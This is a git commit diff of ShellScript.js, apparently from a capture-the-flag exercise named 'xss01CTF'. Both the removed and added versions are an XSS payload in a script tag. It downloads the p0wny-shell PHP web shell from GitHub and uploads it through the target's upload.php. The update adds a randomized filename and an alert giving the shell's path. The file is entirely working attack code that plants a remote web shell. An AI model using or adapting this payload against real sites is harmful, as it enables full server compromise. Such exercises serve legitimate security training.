a017fb2f0e0eeac7f8e5a6cb7a4487f81502a095
CybersRMUTL <cybers@rmutl.ac.th>
2025-12-19 13:54:46 +0700

    Update ShellScript.js

--- ShellScript.js
+++ ShellScript.js
@@ -1,10 +1,29 @@
 <script>
-fetch('https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php')
-  .then(r => r.text())
-  .then(code => {
-    const form = new FormData();
-    form.append('file', new Blob([code], {type: 'application/x-php'}), 'shell.php');
-    fetch('/xss01CTF/upload.php', {method: 'POST', body: form});
-  })
-  .then(() => alert('Shell: /xss01CTF/upload/shell.php'));
+(function () {
+
+  function randomName(len = 5) {
+    return 'file_' + Math.random().toString(36).substr(2, len) + '.php';
+  }
+
+  const filename = randomName();
+
+  fetch('https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php')
+    .then(r => r.text())
+    .then(code => {
+      const form = new FormData();
+      form.append(
+        'file',
+        new Blob([code], { type: 'application/x-php' }),
+        filename
+      );
+      return fetch('/xss01CTF/upload.php', {
+        method: 'POST',
+        body: form
+      });
+    })
+    .then(() => {
+      alert('Shell uploaded: /xss01CTF/upload/' + filename);
+    });
+
+})();
 </script>
